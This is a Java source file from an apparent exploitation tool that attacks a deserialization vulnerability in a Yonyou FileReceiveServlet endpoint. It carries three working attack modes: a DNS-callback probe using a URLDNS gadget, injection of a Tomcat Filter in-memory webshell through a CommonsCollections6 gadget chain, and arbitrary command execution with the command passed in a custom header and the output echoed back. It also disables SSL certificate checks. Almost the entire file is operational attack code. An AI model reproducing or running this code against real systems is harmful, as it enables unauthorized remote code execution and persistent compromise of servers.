package com.chave.vuln;

import com.chave.bean.ClassCode;
import com.chave.bean.ClassName;
import com.chave.bean.Config;
import com.chave.gadget.chain.CommonsCollections6_Array;
import com.chave.gadget.chain.URLDNS;
import com.chave.proxy.HttpProxy;
import com.chave.utils.HttpUtil;
import com.chave.utils.SSLUtil;
import com.chave.utils.Util;
import javafx.scene.control.TextArea;

import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.ObjectOutputStream;
import java.net.HttpURLConnection;
import java.net.URL;

public class FileReceiveServlet_Unserialize extends VulnBase {
    public static boolean DNSLOG = true;
    public static boolean JNDI = false;
    public static boolean EXEC = true;
    public static boolean UPLOAD = false;
    public static boolean GETSHELL = true;

    private String flag = "yyds";

    public FileReceiveServlet_Unserialize() {
    }

    public FileReceiveServlet_Unserialize(TextArea log, TextArea uploadLog, TextArea execLog) {
        super(log, uploadLog, execLog);
    }

    @Override
    public void exploit() throws ClassNotFoundException, NoSuchFieldException, InstantiationException, IllegalAccessException, IOException {
        String vulnerable_url = Config.TARGET + "/servlet/~uapss/com.yonyou.ante.servlet.FileReceiveServlet";

        try {
            if (Config.MOD.equals("poc")) {
                poc(vulnerable_url);
                return;
            } else if (Config.MOD.equals("exp")) {
                exp(vulnerable_url);
                return;
            } else if (Config.MOD.equals("exec")) {
                exec(vulnerable_url);
                return;
            }
        } catch (Exception e) {

        }
    }

    private void poc(String url) {
        try {
            if (Config.DNSLOG == null) {
                logMessage("[-] 请输入 dnslog 信息.");
                return;
            }

            URL apiUrl = new URL(url);

            // 设置全局http代理
            HttpProxy.setProxy();

            // 信任ssl证书
            SSLUtil.trustAllCertificates();

            // 发送请求
            byte[] postData = Util.getSerializedData(URLDNS.getObject("FileReceiveServlet." + Config.DNSLOG));
            HttpURLConnection urldns_conn = (HttpURLConnection) apiUrl.openConnection();

            // 设置超时
            HttpUtil.setTimeout(urldns_conn);

            // 设置请求头
            urldns_conn.setRequestProperty("Content-Type", "application/octet-stream");
            urldns_conn.setRequestProperty("Content-Length", String.valueOf(postData.length));

            HttpUtil.post(urldns_conn, postData);

            int responseCode = HttpUtil.getResponseCode(urldns_conn);
            if (responseCode == HttpURLConnection.HTTP_OK) {
                logMessage("[+] FileReceiveServlet 反序列化探测成功! 状态码: " + responseCode + ". 请前往对应 dnslog 平台查看结果.");
            } else {
                logMessage("[-] FileReceiveServlet 反序列化探测失败, 状态码: " + responseCode);
            }
        } catch (Exception e) {
            logMessage("[-] FileReceiveServlet 反序列化探测失败, 请尝试手动探测. " + e);
        }
    }

    private void exp(String url) {
        try {
            URL apiUrl = new URL(url);

            // 设置全局http代理
            HttpProxy.setProxy();

            // 信任ssl证书
            SSLUtil.trustAllCertificates();

            byte[] postData = Util.getSerializedData(CommonsCollections6_Array.getObject("DefiningClassLoader", new String[]{ClassName.TomcatFilterMemshellFromThread, ClassCode.Tomcat7_FilterMemshellFromThread_JDK7}));

            HttpURLConnection conn = (HttpURLConnection) apiUrl.openConnection();

            // 设置超时
            HttpUtil.setTimeout(conn);

            // 设置请求头
            conn.setRequestProperty("Content-Type", "application/octet-stream");
            conn.setRequestProperty("Content-Length", String.valueOf(postData.length));

            HttpUtil.post(conn, postData);

            int responseCode = HttpUtil.getResponseCode(conn);
            if (responseCode == HttpURLConnection.HTTP_OK) {
                logMessage("[+] Filter 内存马注入成功! 请手动连接验证.");
                return;
            } else {
                logMessage("[-] FileReceiveServlet 反序列化利用失败, 状态码: " + responseCode);
                return;
            }
        } catch (Exception e) {
            logMessage("[-] FileReceiveServlet 反序列化利用失败, 请尝试手动利用. " + e);
            return;
        }
    }

    private void exec(String url) {
        try {
            URL apiUrl = new URL(url);

            // 设置全局http代理
            HttpProxy.setProxy();

            // 信任ssl证书
            SSLUtil.trustAllCertificates();

            // 发送请求
            ByteArrayOutputStream baos = new ByteArrayOutputStream();
            ObjectOutputStream oos = new ObjectOutputStream(baos);
            oos.writeObject(CommonsCollections6_Array.getObject("DefiningClassLoader", new String[]{ClassName.Tomcat7Echo, ClassCode.Tomcat7Echo_testzxcv4}));
            HttpURLConnection exec_conn = (HttpURLConnection) apiUrl.openConnection();

            // 设置超时
            HttpUtil.setTimeout(exec_conn);

            // 设置请求头
            exec_conn.setRequestProperty("Content-Type", "application/octet-stream");
            exec_conn.setRequestProperty("Content-Length", String.valueOf(baos.toByteArray().length));
            exec_conn.setRequestProperty("testzxcv4", flag + Util.byteCodeToBase64(Config.CMD.getBytes()));

            HttpUtil.post(exec_conn, baos.toByteArray());

            int responseCode = HttpUtil.getResponseCode(exec_conn);
            String responseText = HttpUtil.getResponseText(exec_conn);
            if (responseCode == HttpURLConnection.HTTP_OK && responseText != null && !responseText.isEmpty()) {
                logExec("[+] 命令执行成功!\n" + responseText.substring(0, responseText.length() - 2));
                return;
            } else {
                logExec("[-] 命令执行失败. 请尝试手动利用.");
                return;
            }
        } catch (Exception e) {
            logExec("[-] 命令执行失败, 请尝试手动利用. " + e);
            return;
        }
    }
}
